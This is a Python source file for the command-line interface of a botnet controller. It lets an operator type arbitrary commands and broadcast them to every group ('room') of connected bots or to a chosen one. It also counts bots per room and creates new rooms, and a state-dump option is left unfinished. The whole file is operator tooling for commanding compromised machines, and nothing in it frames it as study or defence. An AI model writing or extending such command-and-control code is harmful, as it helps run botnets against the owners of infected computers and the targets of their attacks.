from botnetController import BotnetController

class CLI:
    controller: BotnetController
    
    def __init__(self, c):
        self.controller = c 

    def command_option(self):
        command = input("What command do you want to run?: ")
        all_rooms = input("Would you like to send command to all rooms [Y/n]? ").lower()
        if all_rooms == 'y':
            self.controller.send_to_all(command)
            return
        
        room_list = list(self.controller.command_rooms.items())
        print("To which room would you like to send a command?")
        for idx, (_, room) in enumerate(room_list):
            print(f"#{idx} | {room.room.name}: {len(room.bots)} bots")
            
        room_nr = int(input("Choose room number: "))
        if room_nr >= len(room_list):
            print("realy??")
            return
        
        _, room = room_list[room_nr]
        self.controller.send_command(command, room)

        
    def show_state_option(self):
        total_bot_count = 0
        for room_id, room in self.controller.command_rooms.items():
            bot_count = len(room.bots)
            total_bot_count += bot_count
            print(f"Room: {room.room.name}: {bot_count} bots")
        print(f"Total Bots: {total_bot_count}")
        

    def create_room_option(self):
        room_name = input("Room name: ")
        room_name = room_name.replace(" ", "_")
        self.controller.add_command_room(room_name)
        print("[+] room created successfully")

    def dump_state(self):
        # TODO
        pass

    def start(self):
        self.controller.run()
        
        print("[+] Controller ready. Enter commands to send to bots.")
        while True:
            print("#1 Send Command")
            print("#2 Show simple botnet state")
            print("#3 Create Room")
            print("#4 Dump state to file")
            option = int(input("What would you like to do? "))
            print()
            match option:
                case 1:
                    self.command_option()
                case 2:
                    self.show_state_option()
                case 3:
                    self.create_room_option()
                case 4:
                    self.dump_state()
                case _:
                    print("Invalid Option, choose again")

            print("-----------------------------------------")


if __name__ == "__main__":
    cli = CLI(BotnetController())
    cli.start()